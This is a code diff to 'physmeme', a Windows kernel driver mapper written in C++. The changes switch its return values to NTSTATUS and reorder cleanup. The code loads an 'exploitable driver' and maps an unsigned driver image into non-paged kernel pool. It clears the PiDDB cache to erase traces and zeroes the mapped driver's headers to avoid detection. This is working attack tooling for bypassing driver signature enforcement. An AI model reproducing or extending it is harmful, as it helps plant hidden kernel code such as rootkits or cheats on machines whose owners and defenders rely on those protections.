@@ -1,13 +1,9 @@
-#include <windows.h>
-#include <iostream>
-#include <fstream>
-
 #include "kernel_ctx/kernel_ctx.h"
 #include "drv_image/drv_image.h"
 
 namespace physmeme
 {
-	bool __cdecl map_driver(std::vector<std::uint8_t>& raw_driver)
+	NTSTATUS __cdecl map_driver(std::vector<std::uint8_t>& raw_driver)
 	{
 		physmeme::drv_image image(raw_driver);
 
@@ -15,22 +11,16 @@ namespace physmeme
 		// load exploitable driver
 		//
 		if (!physmeme::load_drv())
-			return false;
+			return STATUS_ABANDONED;
 
 		physmeme::kernel_ctx ctx;
 
 		//
-		// unload exploitable driver
-		//
-		if (!physmeme::unload_drv())
-			return false;
-
-		//
-		// shoot the tires off the cache.
+		// shoot the tires off piddb cache.
 		//
 		const auto drv_timestamp = util::get_file_header(raw_driver.data())->TimeDateStamp;
 		if (!ctx.clear_piddb_cache(physmeme::drv_key, drv_timestamp))
-			return false;
+			return STATUS_ABANDONED;
 
 		//
 		// lambdas used for fixing driver image
@@ -60,9 +50,6 @@ namespace physmeme
 				NonPagedPool
 			);
 
-		if (!pool_base)
-			return -1;
-
 		image.relocate(pool_base);
 
 		//
@@ -88,12 +75,17 @@ namespace physmeme
 		// zero driver headers
 		//
 		ctx.zero_kernel_memory(pool_base, image.header_size());
-		return !result; // 0x0 means STATUS_SUCCESS
+
+		physmeme::unmap_all();
+		if (!physmeme::unload_drv())
+			return STATUS_ABANDONED;
+
+		return result;
 	}
 
-	bool __cdecl map_driver(std::uint8_t * image, std::size_t size)
+	NTSTATUS __cdecl map_driver(std::uint8_t * image, std::size_t size)
 	{
-		auto data = std::vector<std::uint8_t>(image, image + size);
+		std::vector<std::uint8_t> data(image, image + size);
 		return map_driver(data);
 	}
 }
